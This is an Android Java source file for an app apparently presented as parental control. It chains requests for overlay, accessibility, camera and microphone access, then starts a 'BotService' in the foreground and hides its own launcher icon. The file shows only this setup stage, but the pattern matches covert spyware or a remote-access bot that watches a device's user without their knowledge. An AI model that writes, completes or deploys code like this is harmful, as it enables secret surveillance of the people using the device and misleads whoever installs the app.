package com.parentcontrol;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQUEST = 1;
    private static final int OVERLAY_REQUEST = 2;
    private static final int ACCESSIBILITY_REQUEST = 3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_REQUEST);
            return;
        }

        if (!isAccessibilityEnabled()) {
            startActivityForResult(
                new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
                ACCESSIBILITY_REQUEST
            );
            return;
        }

        String[] perms = getRequiredPermissions();
        if (!hasPermissions(perms)) {
            ActivityCompat.requestPermissions(this, perms, PERM_REQUEST);
            return;
        }

        startAndFinish();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String services = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private String[] getRequiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        return perms.toArray(new String[0]);
    }

    private boolean hasPermissions(String[] permissions) {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        recreate();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        startAndFinish();
    }

    private void startAndFinish() {
        startForegroundService(new Intent(this, BotService.class));
        hideAppIcon();
        finish();
    }

    private void hideAppIcon() {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
